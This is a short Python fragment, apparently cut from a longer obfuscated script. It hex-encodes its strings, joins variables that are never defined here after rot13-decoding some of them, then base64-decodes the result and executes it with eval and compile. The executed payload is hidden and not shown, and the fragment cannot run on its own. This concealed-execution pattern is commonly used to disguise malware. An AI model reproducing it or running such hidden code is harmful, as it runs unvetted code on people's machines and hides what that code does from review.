joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))